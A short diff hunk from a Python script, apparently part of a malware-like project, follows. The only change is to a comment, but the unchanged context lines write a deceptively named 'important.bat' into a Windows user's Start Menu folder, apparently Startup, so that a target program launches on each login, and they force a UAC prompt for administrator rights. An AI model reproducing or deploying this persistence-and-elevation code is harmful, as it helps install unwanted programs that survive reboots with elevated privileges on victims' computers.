@@ -9,7 +9,7 @@ bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 with open(bat_path + '\\' + "important.bat", "w") as bat_file:
     bat_file.write(f'start "" {target_path}')
 
-# IF UAC is not given, run.py will not be executed
+# IF UAC is not given, main-traverse.py will not be executed
 if not UAC.isUserAdmin():
     UAC.runAsAdmin()
 
